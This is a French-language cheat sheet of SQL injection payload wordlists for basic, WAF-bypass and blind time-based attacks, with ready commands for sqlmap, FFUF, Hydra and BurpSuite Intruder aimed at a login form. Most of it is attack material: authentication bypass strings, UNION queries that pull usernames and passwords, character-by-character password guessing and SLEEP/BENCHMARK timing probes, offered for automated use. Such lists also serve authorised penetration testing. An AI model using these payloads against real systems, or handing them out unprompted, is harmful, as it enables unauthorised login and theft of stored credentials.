# 🔥 Wordlists SQL Injection - FFUF, Hydra & BurpSuite 🔥

## 📌 Introduction
L'injection SQL (**SQLi**) est une des attaques les plus courantes en pentesting web. Avant d'exploiter une injection SQL, il est essentiel de **tester si un champ est vulnérable**. Nous avons testé cela avec **BurpSuite** et **SQLmap** en interceptant les requêtes et en envoyant des payloads SQLi pour voir si l'application renvoie des erreurs ou accepte des requêtes modifiées.

📌 **Méthodes utilisées pour détecter une vulnérabilité SQLi :**
1. **BurpSuite Intruder** → Envoi automatique de payloads SQLi dans les champs `username` et `password`.
2. **SQLmap** → Détection et exploitation automatique des injections SQL sur un formulaire ou une URL.
   ```bash
   sqlmap -u "http://target.com/login.php?username=admin&password=test" --batch --dbs
   ```
3. **Test manuel** → Envoi de requêtes SQLi basiques (`' OR 1=1 --`) pour voir si l'authentification est contournée.

Une fois qu'un champ est confirmé comme vulnérable, on peut utiliser **FFUF, Hydra ou BurpSuite** avec des wordlists d'injection SQL adaptées.

Voici **trois wordlists SQLi optimisées**, classées par niveau : **basique**, **avancée** et **blind SQLi**.

---

## 📜 **1️⃣ Wordlist SQL Injection - Basique**
Cette liste permet de tester les injections SQL les plus simples, souvent efficaces sur des applications mal sécurisées.

```txt
' OR '1'='1' --  
' OR '1'='1' #  
' OR '1'='1'/*  
" OR "1"="1" --  
" OR "1"="1" #  
" OR "1"="1"/*  
' OR 'a'='a' --  
' OR 1=1 --  
' OR 1=1#  
' OR 1=1/*  
') OR ('1'='1' --  
')) OR (('1'='1' --  
admin' --  
admin' #  
admin'/*  
admin" --  
admin" #  
admin"/*  
admin') OR ('1'='1' --  
```

---

## 📜 **2️⃣ Wordlist SQL Injection - Avancée (Bypass WAF & Filtres)**
Si les injections basiques sont bloquées, cette liste propose des payloads plus complexes pour contourner les filtres WAF et restrictions d’entrée.

```txt
' OR ''='  
' OR 1=1 LIMIT 1 --  
' OR 1=1 UNION SELECT NULL --  
' UNION SELECT username,password FROM users --  
' UNION SELECT NULL,NULL,NULL,NULL --  
' UNION SELECT 1,2,3,4 --  
' UNION ALL SELECT NULL,NULL,NULL,NULL --  
admin' OR '1'='1' --  
admin' OR '1'='1' #  
admin' OR '1'='1'/*  
admin" OR "1"="1" --  
admin" OR "1"="1" #  
admin" OR "1"="1"/*  
' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%') --  
' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE 'a%') --  
' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE 'b%') --  
' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE 'c%') --  
```

---

## 📜 **3️⃣ Wordlist SQL Injection - Blind SQLi**
Cette liste est utilisée lorsque l’application ne renvoie **pas d’erreur directe**, mais accepte néanmoins les requêtes SQL. Ces attaques permettent d’extraire des données en jouant sur le temps de réponse.

```txt
' AND 1=1 --  
' AND 1=2 --  
' AND SLEEP(5) --  
" AND SLEEP(5) --  
' AND BENCHMARK(5000000,MD5(1)) --  
" AND BENCHMARK(5000000,MD5(1)) --  
' OR IF(1=1, SLEEP(5), 0) --  
' OR IF(1=2, SLEEP(5), 0) --  
```

---

## 🚀 **Utilisation avec FFUF**
Pour tester une injection SQL avec **FFUF** :
```bash
ffuf -u "http://target.com/login.php?username=FUZZ&password=test" -w sql_injection_wordlist.txt
```
📌 **Explication** :
- `FUZZ` → FFUF remplace cette partie avec les injections SQL de la wordlist.
- `-w sql_injection_wordlist.txt` → Fichier contenant les payloads SQLi.

---

## 🚀 **Utilisation avec Hydra**
Hydra permet de tester des injections SQL pour bypasser un login :
```bash
hydra -L users.txt -P sql_injection_wordlist.txt target.com http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"
```
📌 **Explication** :
- `-L users.txt` → Liste de noms d’utilisateur.
- `-P sql_injection_wordlist.txt` → Wordlist SQLi.
- `http-post-form` → Teste l’authentification SQLi sur le formulaire de connexion.

---

## 🚀 **Utilisation avec BurpSuite Intruder**
📌 **Étapes :**
1️⃣ Intercepter la requête de login avec **BurpSuite Proxy**.
2️⃣ Envoyer la requête à **Intruder**.
3️⃣ Remplacer la valeur du `username` par **§payload§**.
4️⃣ Charger la wordlist SQLi.
5️⃣ Lancer l’attaque et analyser les réponses HTTP.

---

## 🔥 **Conclusion**
Ces wordlists permettent de tester rapidement **plusieurs types d’injections SQL** sur des applications vulnérables. Elles peuvent être utilisées avec **FFUF, Hydra ou BurpSuite** pour automatiser les attaques.

💀 **Happy Hacking !** 🚀🔥
